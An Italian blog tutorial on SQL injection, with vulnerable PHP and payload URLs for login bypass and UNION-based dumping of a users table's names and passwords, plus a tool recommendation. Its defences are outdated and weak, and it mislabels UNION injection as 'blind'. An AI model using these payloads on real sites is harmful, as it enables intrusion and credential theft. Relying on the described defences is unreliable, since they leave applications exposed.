Beh, forse non è poi così sconosciuta, ma mi andava di scrivere un post tecnico, e visto che parlavo di injection con un collega giusto ieri, ho preso la palla al balzo.<br />Quindi...<br /><br /><a name='more'></a><br /><h3>                     Un po' di storia</h3><br />La <strong>SQL injection</strong> è una tecnica mirata a colpire applicazioni web basate su database <strong>SQL</strong>.<br />Sfruttando il mancato controllo sui dati ricevuti in input ed iniettando codice malevolo all'interno di una query SQL permette ad un malintenzionato di autenticarsi senza essere in possesso delle credenziali e/o di visualizzare e alterare dati sensibili.<br /><br />Vediamo un esempio:<br /><br /><pre style="background-color: #eeeeee; border: 1px dashed #999999; color: black; font-family: Andale Mono, Lucida Console, Monaco, fixed, monospace; font-size: 12px; line-height: 14px; overflow: auto; padding: 5px; width: 100%;"><code>http://www.dominio.com/dettaglio.php?id_dettaglio=42<br /></code></pre><br />(ipotizziamo che la pagina debba restituire il dettaglio corrispondente all'id 42)<br /><br />Il parametro passato (42) sarà quindi processato dalla pagina lato server che lo riceve, e presumibilmente utilizzato come parte di una query SQL utilizzata per estrarre i dati.<br /><br />La pagina lato server (dettaglio.php) potrebbe essere strutturata in questo modo:<br /><br /><pre style="background-color: #eeeeee; border: 1px dashed #999999; color: black; font-family: Andale Mono, Lucida Console, Monaco, fixed, monospace; font-size: 12px; line-height: 14px; overflow: auto; padding: 5px; width: 100%;"><code>[...]<br />$id_dettaglio = $_GET['id_dettaglio'];<br />$result = mysql_query("SELECT * FROM articoli WHERE id_articolo=$id_dettaglio");<br />[...]<br /></code></pre><br />Una pagina così realizzata è quindi vulnerabile ad una 'iniezione' di codice SQL.<br /><br />Proviamo infatti a modificare in questo modo l'URL:<br /><br /><pre style="background-color: #eeeeee; border: 1px dashed #999999; color: black; font-family: Andale Mono, Lucida Console, Monaco, fixed, monospace; font-size: 12px; line-height: 14px; overflow: auto; padding: 5px; width: 100%;"><code>http://www.dominio.com/dettaglio.php?id_dettaglio=42+or+1=1<br /></code></pre><br />la query costruita in questo modo<br /><br /><pre style="background-color: #eeeeee; border: 1px dashed #999999; color: black; font-family: Andale Mono, Lucida Console, Monaco, fixed, monospace; font-size: 12px; line-height: 14px; overflow: auto; padding: 5px; width: 100%;"><code>"SELECT * FROM articoli WHERE id_articolo=$id_dettaglio"<br /></code></pre><br />restituirà questo curioso risultato:<br /><br /><pre style="background-color: #eeeeee; border: 1px dashed #999999; color: black; font-family: Andale Mono, Lucida Console, Monaco, fixed, monospace; font-size: 12px; line-height: 14px; overflow: auto; padding: 5px; width: 100%;"><code>SELECT * FROM articoli WHERE id_articolo=42 or 1=1<br /></code></pre><br />che, una volta eseguito, restituirà non l'articolo 42 ma il primo presente nella tabella 'articoli'.<br /><br />E fino a qui, i problemi sono minimi, ma prendiamo in considerazione una pagina di questo tipo:<br /><br /><pre style="background-color: #eeeeee; border: 1px dashed #999999; color: black; font-family: Andale Mono, Lucida Console, Monaco, fixed, monospace; font-size: 12px; line-height: 14px; overflow: auto; padding: 5px; width: 100%;"><code>[...]<br />$user = $_GET['user']; $pass = $_GET['password'];<br />$result = mysql_query("SELECT * FROM users WHERE user='$user' AND pass='$pass'");<br />[...]<br /></code></pre><br />che riceve dati tramite questo URL<br /><br /><pre style="background-color: #eeeeee; border: 1px dashed #999999; color: black; font-family: Andale Mono, Lucida Console, Monaco, fixed, monospace; font-size: 12px; line-height: 14px; overflow: auto; padding: 5px; width: 100%;"><code>http://www.dominio.com/accesso.php?user=admin&amp;pass=password<br /></code></pre><br />Come nel precedente esempio, i dati di accesso vengono prelevati ed utilizzati senza alcun controllo, permettendoci di modificare i dati in questo modo (utilizzo il GET come esempio più leggibile, la tecnica funziona allo stesso modo anche con un POST):<br /><br /><pre style="background-color: #eeeeee; border: 1px dashed #999999; color: black; font-family: Andale Mono, Lucida Console, Monaco, fixed, monospace; font-size: 12px; line-height: 14px; overflow: auto; padding: 5px; width: 100%;"><code>http://www.dominio.com/accesso.php?user=admin&amp;pass='+or+''='<br /></code></pre><br />Quando la pagina andrà a 'montare' la query, con questa concatenazione di stringhe<br /><br /><pre style="background-color: #eeeeee; border: 1px dashed #999999; color: black; font-family: Andale Mono, Lucida Console, Monaco, fixed, monospace; font-size: 12px; line-height: 14px; overflow: auto; padding: 5px; width: 100%;"><code>"SELECT * FROM users WHERE user='$user' AND pass='$pass'"<br /></code></pre><br />il risultato sarà il seguente:<br /><br /><pre style="background-color: #eeeeee; border: 1px dashed #999999; color: black; font-family: Andale Mono, Lucida Console, Monaco, fixed, monospace; font-size: 12px; line-height: 14px; overflow: auto; padding: 5px; width: 100%;"><code>SELECT * FROM users WHERE user='admin' AND pass='' or ''=''<br /></code></pre><br />Eseguita la query, a prescindere dalle credenziali inserite il recordset risultante conterrà tutti i dati degli utenti, e presumibilmente la pagina sceglierà come valido il primo disponibile (l'admin? :-P)<br /><br />Questo tipo di <strong>injections</strong> dimostrano già un grande potenziale, ma sono frenate da una grande limitazione: la mancata conoscenza della struttura del database presente dietro la pagina web.<br />Per ottenere maggiori informazioni, e virtualmente accedere all'intero set di dati presenti nel database si utilizza una tecnica chiamata <strong>Blind SQL Injection</strong>.<br /><h3>               Blind? perchè 'cieca?'</h3><br /><strong>Blind</strong> (cieca) perchè, nella fase di ricerca delle informazioni necessarie si procede letteralmente alla cieca, sfruttando il costrutto <a href="http://www.w3schools.com/sql/sql_union.asp" target="_blank"><strong>UNION</strong></a> di <strong>SQL</strong>.<br />Vi ricordo che <strong>UNION</strong> permette di 'unire' i risultati di 2 query a patto che queste ottengano lo stesso numero di colonne e i medesimi tipi di dati.<br /><br />Per prima cosa, recuperiamo il precedente URL<br /><br /><pre style="background-color: #eeeeee; border: 1px dashed #999999; color: black; font-family: Andale Mono, Lucida Console, Monaco, fixed, monospace; font-size: 12px; line-height: 14px; overflow: auto; padding: 5px; width: 100%;"><code>http://www.dominio.com/dettaglio.php?id_dettaglio=42<br /></code></pre><br />e cerchiamo di iniettare codice per generare una query valida contenente una <strong>UNION</strong>:<br /><br /><pre style="background-color: #eeeeee; border: 1px dashed #999999; color: black; font-family: Andale Mono, Lucida Console, Monaco, fixed, monospace; font-size: 12px; line-height: 14px; overflow: auto; padding: 5px; width: 100%;"><code>http://www.dominio.com/dettaglio.php?id_dettaglio=42+UNION+ALL+SELECT+0,1,2<br /></code></pre><br />che genererà quindi nel backend una query di questo tipo:<br /><br /><pre style="background-color: #eeeeee; border: 1px dashed #999999; color: black; font-family: Andale Mono, Lucida Console, Monaco, fixed, monospace; font-size: 12px; line-height: 14px; overflow: auto; padding: 5px; width: 100%;"><code>SELECT * FROM articoli WHERE id_articolo=42 UNION ALL SELECT 0,1,2<br /></code></pre><br />In questo caso tentiamo ipotizzando che la tabella letta dalla pagina dettaglio.php contenga 3 campi: se l'ipotesi si dimostrerà vera, la pagina verrà caricata senza errori, in caso contrario ci verrà restituito un messaggio di errore, e dovremmo continuare a 'tentare la fortuna' con un numero diverso di campi:<br /><br /><pre style="background-color: #eeeeee; border: 1px dashed #999999; color: black; font-family: Andale Mono, Lucida Console, Monaco, fixed, monospace; font-size: 12px; line-height: 14px; overflow: auto; padding: 5px; width: 100%;"><code>http://www.dominio.com/dettaglio.php?id_dettaglio=42+UNION+ALL+SELECT+0,1,2,3<br />http://www.dominio.com/dettaglio.php?id_dettaglio=42+UNION+ALL+SELECT+0,1,2,3,4<br />http://www.dominio.com/dettaglio.php?id_dettaglio=42+UNION+ALL+SELECT+0,1,2,3,4,5<br /></code></pre><br />Ecc...<br /><br />fino a trovare la sequenza che permette il caricamento della pagina senza errori.<br /><br />A questo punto, considerando valido l'ultimo URL , possiamo realizzare una injection di questo tipo<br /><br /><pre style="background-color: #eeeeee; border: 1px dashed #999999; color: black; font-family: Andale Mono, Lucida Console, Monaco, fixed, monospace; font-size: 12px; line-height: 14px; overflow: auto; padding: 5px; width: 100%;"><code>http://www.dominio.com/dettaglio.php?id_dettaglio=42+UNION+ALL+SELECT+0,1,2,3,4,5+limit+0,1<br /></code></pre><br /><strong>LIMIT 0,1</strong> farà in modo che i dati da noi inseriti con la <strong>UNION</strong> vengano visualizzati per primi e presumibilmente mostrati nella pagina, nelle posizioni che il programmatore aveva destinato ai dati 'veri'.<br />Ora abbiamo quindi un URL che ci permette di visualizzare in una zona ben definita della pagina un dato a nostra scelta, questo ci permette di conoscere, un passo alla volta la struttura del database.<br /><br />Inviamo infatti questa richiesta:<br /><br /><pre style="background-color: #eeeeee; border: 1px dashed #999999; color: black; font-family: Andale Mono, Lucida Console, Monaco, fixed, monospace; font-size: 12px; line-height: 14px; overflow: auto; padding: 5px; width: 100%;"><code>http://www.dominio.com/dettaglio.php?id_dettaglio=42+UNION+ALL+SELECT+table_name,1,2,3,4,5+FROM+information_schema.tables+limit+0,1<br /></code></pre><br />e, accedendo all'<strong>information_schema</strong>, otteniamo il nome della prima tabella presente nel database.<br />Proseguiamo con una serie di richieste<br /><br /><pre style="background-color: #eeeeee; border: 1px dashed #999999; color: black; font-family: Andale Mono, Lucida Console, Monaco, fixed, monospace; font-size: 12px; line-height: 14px; overflow: auto; padding: 5px; width: 100%;"><code>http://www.dominio.com/dettaglio.php?id_dettaglio=42+UNION+ALL+SELECT+table_name,1,2,3,4,5+FROM+information_schema.tables+limit+1,1<br />http://www.dominio.com/dettaglio.php?id_dettaglio=42+UNION+ALL+SELECT+table_name,1,2,3,4,5+FROM+information_schema.tables+limit+2,1<br />http://www.dominio.com/dettaglio.php?id_dettaglio=42+UNION+ALL+SELECT+table_name,1,2,3,4,5+FROM+information_schema.tables+limit+3,1<br /></code></pre><br />e sulla pagina potremo visualizzati i nomi delle altre tabelle del <strong>DB</strong>.<br /><br />In questo modo, scoprire che (ad esempio) la tabella utenti risponde al nome di <em>USERS</em> è cosa semplice, e diventa banale anche ottenere il nome delle colonne presenti al suo interno:<br /><br /><pre style="background-color: #eeeeee; border: 1px dashed #999999; color: black; font-family: Andale Mono, Lucida Console, Monaco, fixed, monospace; font-size: 12px; line-height: 14px; overflow: auto; padding: 5px; width: 100%;"><code>http://www.dominio.com/dettaglio.php?id_dettaglio=42+UNION+ALL+SELECT+column_name,1,2,3,4,5+FROM+information_schema.columns+where+table_name='USERS'+LIMIT+0,1<br />http://www.dominio.com/dettaglio.php?id_dettaglio=42+UNION+ALL+SELECT+column_name,1,2,3,4,5+FROM+information_schema.columns+where+table_name='USERS'+LIMIT+1,1<br />http://www.dominio.com/dettaglio.php?id_dettaglio=42+UNION+ALL+SELECT+column_name,1,2,3,4,5+FROM+information_schema.columns+where+table_name='USERS'+LIMIT+2,1<br /></code></pre><br />e così via.<br /><br />In ultimo, avendo tutti i dati necessari, possiamo effettuare il dump dei dati presenti nella tabella <em>USERS</em>:<br /><br /><pre style="background-color: #eeeeee; border: 1px dashed #999999; color: black; font-family: Andale Mono, Lucida Console, Monaco, fixed, monospace; font-size: 12px; line-height: 14px; overflow: auto; padding: 5px; width: 100%;"><code>http://www.dominio.com/dettaglio.php?id_dettaglio=42+UNION+ALL+SELECT+user,1,2,3,4,5+FROM+USERS+LIMIT+0,1<br />http://www.dominio.com/dettaglio.php?id_dettaglio=42+UNION+ALL+SELECT+pass,1,2,3,4,5+FROM+USERS+LIMIT+0,1<br /><br />http://www.dominio.com/dettaglio.php?id_dettaglio=42+UNION+ALL+SELECT+user,1,2,3,4,5+FROM+USERS+LIMIT+1,1<br />http://www.dominio.com/dettaglio.php?id_dettaglio=42+UNION+ALL+SELECT+pass,1,2,3,4,5+FROM+USERS+LIMIT+1,1<br /><br />http://www.dominio.com/dettaglio.php?id_dettaglio=42+UNION+ALL+SELECT+user,1,2,3,4,5+FROM+USERS+LIMIT+2,1<br />http://www.dominio.com/dettaglio.php?id_dettaglio=42+UNION+ALL+SELECT+pass,1,2,3,4,5+FROM+USERS+LIMIT+2,1<br /></code></pre><br />Se la procedura sembra lunga e noiosa, è bene sapere che esistono tools per la realizzazione delle <strong>BLIND SQL Injections</strong>, che permettono di automatizzare tutti gli step, dalla ricerca della UNION corretta alla estrazione della struttura del <strong>DB</strong> fino al <em>dump</em> dei dati.<br /><br />Uno dei più efficaci è a mio avviso è <a href="http://www.ehacking.net/2011/10/darkmysqli-mysql-injection-tool.html" target="_blank">DarkMYSQLi</a>.<br /><h3>                     Come difendersi?</h3><br />3 semplici soluzioni (in ambiente PHP+Mysql):<br /><ol><br /><li>Impostare la direttiva <strong>magic_quotes_gpc</strong> del <em>php.ini</em> ad ON: permette di effettuare un escaping automatico dei dati ricevuti tramite form o url.</li><br /><li>Utilizzare la funzione <strong>mysql_escape_string</strong> di PHP: a grandi linee la versione 'manuale' della modifica al php.ini.</li><br /><li>Verifica dei dati tramite espressioni regolari, in modo da verificare la correttezza degli input prima di effettuare operazioni sul database</li></ol><br />Maggiori informazioni le potete trovare in questo articolo di <a href="http://php.html.it/guide/lezione/2988/evitare-ogni-tipo-di-sql-injection/" target="_blank">HTML.it</a>.